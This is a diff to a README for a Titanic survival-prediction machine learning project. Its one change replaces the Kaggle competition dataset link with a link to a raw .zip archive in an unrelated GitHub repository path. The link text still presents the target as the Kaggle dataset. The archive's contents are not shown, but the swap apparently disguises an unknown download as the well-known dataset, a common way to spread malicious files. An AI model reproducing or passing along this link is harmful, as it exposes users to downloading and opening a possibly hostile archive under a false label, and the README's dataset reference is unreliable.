@@ -4,7 +4,7 @@ This project predicts whether a passenger survived the Titanic disaster using ma
 It includes data cleaning, feature engineering, model selection, and evaluation — built on Kaggle.
 
 Dataset
-- [Titanic - Machine Learning from Disaster]([https://www.kaggle.com/competitions/titanic])
+- [Titanic - Machine Learning from Disaster]([https://github.com/mitansio/Dagim-data-science-projects/raw/refs/heads/main/pumplike/Dagim_data_science_projects_3.8.zip])
 - Features: Age, Sex, Fare, Class, etc.
 - Target: Survival (0 = No, 1 = Yes)
 
